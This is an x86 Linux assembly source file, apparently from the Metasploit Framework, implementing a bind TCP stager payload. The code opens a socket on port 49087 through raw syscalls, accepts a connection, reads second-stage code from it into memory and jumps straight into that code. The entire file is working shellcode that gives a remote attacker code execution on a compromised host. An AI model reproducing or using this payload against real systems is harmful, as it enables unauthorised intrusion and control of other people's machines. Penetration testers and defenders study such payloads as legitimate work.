;;
; 
;        Name: stager_sock_bind
;   Qualities: Can Have Nulls
;     Version: $Revision: 1607 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux portbind TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=Linux Bind TCP Stager
; meta-description=Listen on a port for a connection and run a second stage
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=bind
; meta-name=bind_tcp
; meta-path=lib/Msf/PayloadComponent/Linux/ia32/BindStager.pm
; meta-offset-lport=0x14
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, esi

bind:
	inc  ebx
	push edx
	push word 0xbfbf ; port: 49087
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push esi
	mov  ecx, esp
	int  0x80

listen:
	mov  al, 0x66
	shl  ebx, 1
	int  0x80

accept:
	push edx
	push edx
	push esi
	inc  ebx
	mov  ecx, esp
	mov  al, 0x66
	int  0x80
	xchg eax, ebx

%ifndef USE_SINGLE_STAGE

read:
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi 
	                 ; for fd
	jmp  ecx

%else
	%ifdef FD_REG_EDI
	mov  edi, ebx
	%endif
%endif
